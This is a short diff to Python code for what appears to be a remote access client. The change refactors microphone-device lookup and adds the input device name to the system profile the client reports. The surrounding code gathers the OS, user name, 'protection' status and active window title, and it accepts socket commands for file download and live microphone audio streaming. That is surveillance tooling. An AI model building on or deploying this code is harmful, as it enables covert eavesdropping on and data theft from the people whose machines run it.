@@ -209,7 +209,7 @@ def pc_info():
         'os': __os__,
         'protection': str(active),
         'user': __user__,
-        'version': __version__,
+        'inputdevice': get_default_input_device(),
         'activewindowtitle': get_window_title(),
     })
 
@@ -283,9 +283,13 @@ def download(sock, filename, end="[ENDOFMESSAGE]"):
 
 
 def get_default_input_device():
-    p = pyaudio.PyAudio()
-    device_name = p.get_default_input_device_info()
-    return device_name['name']
+    try:
+        p = pyaudio.PyAudio()
+        device_name = p.get_default_input_device_info()
+        del p
+        return device_name['name']
+    except IOError:
+        return 'NoDevice'
 
 
 def screen_bits():
@@ -441,10 +445,7 @@ class ChildSocket(threading.Thread):
                     except:
                         stdoutput = 'downloadError'
                 elif data.startswith('getDefaultInputDeviceName'):
-                    try:
-                        stdoutput = get_default_input_device()
-                    except IOError:
-                        stdoutput = 'NoDevice'
+                    stdoutput = get_default_input_device()
                 elif data.startswith('startAudio'):
                     try:
                         audio_thread = AudioStreaming(self.socket, int(data.split(' ')[-1]))
